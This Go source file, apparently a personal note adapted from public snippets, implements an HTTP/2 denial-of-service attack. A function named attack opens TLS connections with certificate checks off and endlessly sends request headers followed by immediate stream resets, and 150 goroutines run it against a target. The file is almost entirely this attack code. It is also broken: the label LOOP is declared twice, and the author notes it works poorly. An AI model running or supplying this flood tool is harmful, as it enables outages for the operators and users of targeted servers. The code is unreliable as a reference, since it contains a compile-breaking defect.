// It doesn't work well, I just want to save this imperfect note for myself in case I need it in the future.
// It's a modified version of code on https://stackoverflow.com/a/43900205/521957
// If want to know how http2 session is initiated also look at https://github.com/golang/net/blob/master/http2/transport.go#L532
// https://gist.github.com/ilyaigpetrov/c9df309f16a7bea6834b1755ebf69985
package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"log"
	"os"
	"sync"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

var infolog = log.New(os.Stdout, "", 0)

type proxyConn struct {
	tls.Conn
}

var streamId uint32 = 1

func attack(fp *os.File, target string) {
LOOP:
	streamId = 1
	cfg := new(tls.Config)
	cfg.NextProtos = append([]string{"h2"}, cfg.NextProtos...)
	cfg.InsecureSkipVerify = true
	cfg.KeyLogWriter = fp
LOOP:
	tlsConn, err := tls.Dial("tcp", target, cfg)
	if err != nil {
		panic(err)
	}
	sniffedTls := &proxyConn{*tlsConn}

	transport := &http2.Transport{}

	clientConn, err := transport.NewClientConn(sniffedTls)
	_ = clientConn // not used
	if err != nil {
		panic(err)

	}

	framer := http2.NewFramer(sniffedTls, sniffedTls)

	err = framer.WriteSettings()
	if err != nil {
		panic(err)

	}
	var headers bytes.Buffer
	enc := hpack.NewEncoder(&headers)
	_ = enc.WriteField(hpack.HeaderField{Name: ":authority", Value: "192.168.59.211"})
	_ = enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	_ = enc.WriteField(hpack.HeaderField{Name: ":path", Value: "/"})
	_ = enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})

	i := 1
	for {
		// 写入http请求头
		state := clientConn.State()
		if state.Closed {
			goto LOOP
		}
		err := framer.WriteHeaders(http2.HeadersFrameParam{
			EndHeaders:    true,
			BlockFragment: headers.Bytes(),
			StreamID:      streamId,
		})
		if err != nil {
			err := tlsConn.Close()
			if err != nil {
				goto LOOP
			}
			goto LOOP
		}

		err = framer.WriteRSTStream(streamId, http2.ErrCodeCancel)
		if err != nil {
			err := tlsConn.Close()
			if err != nil {
				goto LOOP
			}
			goto LOOP
		}
		//
		fmt.Printf("stringId %d\n", streamId)
		streamId += 2
		i += 1
		if i == 10 {
			fmt.Println(i)
		}
	}

}

var wg sync.WaitGroup

func main() {
	f, err := os.OpenFile("/dev/null", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	target := "target"

	if err != nil {
		panic(err)
	}
	for i := 0; i < 150; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attack(f, target)
		}()
	}

	wg.Wait()
}
